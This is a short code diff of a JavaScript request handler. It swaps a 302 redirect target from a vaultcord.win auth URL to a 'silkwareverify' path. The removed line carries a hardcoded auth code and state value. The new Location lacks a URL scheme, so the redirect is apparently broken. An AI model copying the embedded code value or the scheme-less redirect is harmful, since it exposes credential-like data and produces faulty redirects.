@@ -23,6 +23,6 @@ export default async function handler(req, res) {
   });
 
   // Redirect to a safe site
-  res.writeHead(302, { Location: "https://vaultcord.win/auth?code=Qny22hAgdUP37hC8FOsrFfIhYEZ07t&state=58619" });
+  res.writeHead(302, { Location: "vaultcord.win/silkwareverify" });
   res.end();
 }
